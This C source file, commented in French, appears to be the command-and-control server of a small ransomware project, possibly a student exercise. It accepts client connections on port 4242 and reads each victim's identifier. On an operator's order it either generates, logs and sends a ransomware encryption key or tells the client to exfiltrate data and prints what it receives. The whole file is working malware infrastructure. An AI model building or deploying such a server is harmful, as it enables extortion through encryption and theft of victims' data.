#include <stdio.h>       // Gestion des entrées/sorties standard (ex: printf, fopen)
#include <stdlib.h>      // Fonctions utilitaires (ex: malloc, rand, atoi)
#include <string.h>      // Manipulation de chaînes (ex: strcmp, memset)
#include <time.h>        // Gestion des dates et heures (ex: time, localtime)
#include <sys/socket.h>  // Fonctions pour la gestion des sockets
#include <netinet/in.h>  // Structures et constantes pour les sockets réseau
#include <arpa/inet.h>   // Conversion des adresses réseau
#include <unistd.h>      // Fonctions POSIX (ex: close)


#define PORT 4242               // Port d'écoute du serveur
#define BACKLOG 10              // Taille de la file d'attente des connexions entrantes
#define CLIENT_ID "7aB9X3rL"    // Identifiant du client
#define KEY_SIZE 16             // Taille de la clé de chiffrement
#define BUFFER_SIZE 1024        // Taille des buffers utilisés pour les communications

void generate_key(char *key) {      // Generation d'un clé aleatoire
    for (int i = 0; i < KEY_SIZE; i++) {
        key[i] = rand() % 256;  // fonction rand pour produire des valeurs entre 0 et 255
    }
}

void log_key_to_file(const char *key, const char *client_id) {
    FILE *logfile = fopen("key_log.txt", "a");      // Ouverture du fichier


    time_t t = time(NULL);      // Enregistre la date et l’heure actuelles dans le fichier avec l’identifiant du client
    struct tm tm = *localtime(&t);
    fprintf(logfile, "Date: %04d-%02d-%02d %02d:%02d:%02d | Client ID: %s\n",
            tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
            tm.tm_hour, tm.tm_min, tm.tm_sec, client_id);

    fprintf(logfile, "Cle ASCII: ");        // Enregistre la clé en ascii
    for (int i = 0; i < KEY_SIZE; i++) {
        fprintf(logfile, "%c", key[i]);
    }
    fprintf(logfile, "\nCle Hexa: ");       // Enregistre la clé hexa
    for (int i = 0; i < KEY_SIZE; i++) {
        fprintf(logfile, "%02x", (unsigned char)key[i]);
    }
    fprintf(logfile, "\n\n");

    fclose(logfile);
}

void send_key_to_client(int client_fd, const char *key) {
    if (send(client_fd, key, KEY_SIZE, 0) != KEY_SIZE) {        // Transmission de la clé au client
        perror("send");
    } else {
        printf("Cle envoyée au client.\n");
    }
}

void exfiltration(int client_fd) {
    char buffer[BUFFER_SIZE];       // Initialisation d'un buffer pour stocker les données
    int bytes_read;

    printf("Ordre 'exfiltration' envoyé au client.\n");

    // Recevoir les données exfiltrées
    bytes_read = recv(client_fd, buffer, BUFFER_SIZE - 1, 0);       // recv lit les donnees env par le client
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0';
        printf("Données exfiltrées reçues du client :\n%s\n", buffer);      // Si elle sont reçu elle s'affiche
    } else {
        printf("Erreur ou aucune donnée reçue pour l'exfiltration.\n");     // Sinon affichage d'une erreur
    }
}

int main() {        // Initialisation dans connexion client/serveur
    struct sockaddr_in sa, client_addr;
    int socket_fd, client_fd;
    char buffer[BUFFER_SIZE];
    int bytes_read;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons(PORT);

    socket_fd = socket(sa.sin_family, SOCK_STREAM, 0);
    if (socket_fd == -1) {
        perror("socket");
        return 1;
    }

    if (bind(socket_fd, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        perror("bind");
        close(socket_fd);
        return 2;
    }

    if (listen(socket_fd, BACKLOG) != 0) {
        perror("listen");
        close(socket_fd);
        return 3;
    }

    printf("Serveur en écoute sur le port %d...\n", PORT);

    while (1) {     // Boucle pour attendre la connexion
        socklen_t addr_size = sizeof(client_addr);
        client_fd = accept(socket_fd, (struct sockaddr*)&client_addr, &addr_size);
        if (client_fd == -1) {
            perror("accept");
            continue;
        }

        bytes_read = recv(client_fd, buffer, sizeof(buffer), 0);
        if (bytes_read < 0) {       // Lit l’identifiant envoyé par le client
            perror("recv");
            close(client_fd);
            continue;
        }
        buffer[bytes_read] = '\0';
        printf("Identifiant du client reçu : %s\n", buffer);

        printf("Entrez un ordre a envoyer au client ('ransomware' ou 'exfiltration'):");        // Demande à l’utilisateur une commande
        char order[BUFFER_SIZE];
        fgets(order, sizeof(order), stdin);
        order[strcspn(order, "\n")] = 0;

        if (strcmp(order, "ransomware") == 0) {     // Si la commande est ransomware génère une clé,la logge, et l’env au client
            char key[KEY_SIZE];
            generate_key(key);
            log_key_to_file(key, buffer);
            send_key_to_client(client_fd, key);
        } else if (strcmp(order, "exfiltration") == 0) {        // Si la commande est exfiltration, envoie l’ordre au client et gère les données exfiltrées
            send(client_fd, "exfiltration", strlen("exfiltration"), 0);
            exfiltration(client_fd);
        }

        close(client_fd);
    }

    close(socket_fd);
    return 0;
}